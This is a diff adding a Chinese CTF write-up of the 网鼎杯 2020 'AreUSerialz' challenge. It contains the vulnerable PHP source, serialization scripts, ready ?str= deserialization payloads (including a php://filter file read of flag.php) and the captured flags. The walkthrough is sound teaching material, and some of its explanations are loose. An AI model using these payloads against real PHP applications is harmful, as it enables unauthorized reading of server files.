@@ -1190,6 +1190,242 @@ POST传参方式
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134619162?spm=1001.2014.3001.5501
 
+## [网鼎杯 2020 青龙组]AreUSerialz 1 (两种解法 超详细！）
+
+题目源码
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if(op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+> 看着源码是很多，其实也不是很难，考察的还是那些东西。
+
+
+PHP知识了解
+> **PHP访问修饰符**
+> **public  **                               公共的   任何成员都可以访问
+> **private**                                私有的   只有自己可以访问
+> 绕过方式：%00类名%00成员名
+> **protected  **                         保护的   只有当前类的成员与继承该类的类才能访问
+> 绕过方式：%00*%00成员名
+
+
+
+> **PHP类**
+> **class                                 **创建类
+
+
+> **PHP关键字**
+> function                               用于用户声明自定义函数
+> $this->                                表示在类本身内部使用本类的属性或者方法
+> isset                                     用来检测参数是否存在并且是否具有值
+
+
+
+> **PHP常见函数**
+> **include()                        **  包含函数        **                   **
+> **highlight_file()**                   函数对文件进行语法高亮显示
+> **file_put_contents()            **函数把一个字符串写入文件中
+> **file_get_contents() **           函数把整个文件读入一个字符串中
+> **is_valid()     **                        检查对象变量是否已经实例化，即实例变量的值是否是个有效的对象
+> strlen                                   计算字符串长度
+> ord                                      用于返回 "S" 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串
+
+
+> **PHP魔法函数**
+> **__construct()    **                  实例化对象时被调用
+> **__destruct()**                     当删除一个对象或对象操作终止时被调用
+
+
+PHP代码审计
+```php
+public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+```
+> 满足对象op=2
+> 执行read读的操作
+
+```php
+private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+```
+> 满足content<100
+> 即可绕过
+> 这段代码看着很长，其实不难分析
+> 利用了函数strlen来检测content对象的字符串长度
+
+```php
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+```
+> 利用ord函数 返回 "S" 的 ASCII值 s为字符串类型 S为16进制字符串数据类型
+> 绕过方式%00转换为\\00即可绕过
+
+```php
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+> GET方式传参
+> 参数是str
+> 将传入的值转为字符串类型
+> 将str参数放入到自定义函数is_valid里面进行反序列化操作
+
+**第一种解法 突破ord函数限制**<br />**序列化代码**
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='flag.php';         
+ //题目中包含flag的文件
+protected $content;
+
+}
+$bai = urlencode(serialize(new FileHandler)); 
+//URL编码实例化后的类FileHandler序列化结果
+$mao =str_replace('%00',"\\00",$bai);    
+//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
+$mao =str_replace('s','S',$mao);         
+//str_replace函数查找变量mao里面的数值s并将其替换为S
+echo $mao                                               
+//打印结果
+?>
+```
+**序列化结果**<br />`O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D`<br />**构造payload**<br />`?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D`<br />**上传payload**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701072490180-607e7eaf-a372-45d3-9bfc-0bd9d696b3a8.png#averageHue=%23fdfdfd&clientId=u9f406969-d7c2-4&from=paste&height=817&id=uf470b1a3&originHeight=1021&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83691&status=done&style=none&taskId=u3c9078d1-105e-4a56-a59f-04c334c594c&title=&width=1531.2)<br />**F12**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701072530293-ea3e6471-6e7f-4cae-9c0b-a153995ab63e.png#averageHue=%23f9f9f8&clientId=u9f406969-d7c2-4&from=paste&height=225&id=u48a8d014&originHeight=281&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40736&status=done&style=none&taskId=u7fcdce36-461a-467b-91c4-0b3cf54c482&title=&width=1530.4)<br />**得到flag：**<br />`flag{e2857c82-19b2-41a5-881e-ecc0c5883d5b}`<br />**第二种解法 突破protected访问修饰符限制**
+> 这个关键点是将受保护的对象转换成公共对象
+
+**序列化代码**
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
+//php://filter伪协议
+protected $content;
+
+}
+$baimao=serialize(new FileHandler());
+//实例化并序列化类FileHandler
+echo $baimao;
+//打印结果
+?>
+```
+**序列化结果**<br />`O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}`<br />**删除乱码并减去相应长度**<br />`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}`<br />**构造payload**<br />`?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}`<br />**上传payload**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701073769668-abbdd717-784d-4a3f-9939-cbd1e7658c1a.png#averageHue=%23fdfcfc&clientId=u9f406969-d7c2-4&from=paste&height=823&id=u7206cf3f&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=87015&status=done&style=none&taskId=u7b2dc687-8e27-4636-bbef-5b086e4a111&title=&width=1536)<br />**回显结果**<br />`PD9waHAgJGZsYWc9J2ZsYWd7ZTI4NTdjODItMTliMi00MWE1LTg4MWUtZWNjMGM1ODgzZDVifSc7Cg==`<br />**base64解码**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701074088247-3b6732d1-005c-403c-8995-922584ed4179.png#averageHue=%23262933&clientId=u9f406969-d7c2-4&from=paste&height=142&id=uad985f93&originHeight=178&originWidth=1432&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=180787&status=done&style=none&taskId=u3cf6220d-9de5-40b1-a6e9-4c52d302c51&title=&width=1145.6)<br />**得到flag：**<br />`flag{e2857c82-19b2-41a5-881e-ecc0c5883d5b}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134648981?spm=1001.2014.3001.5501
+
+
+
+
+
+
+
 
 
 
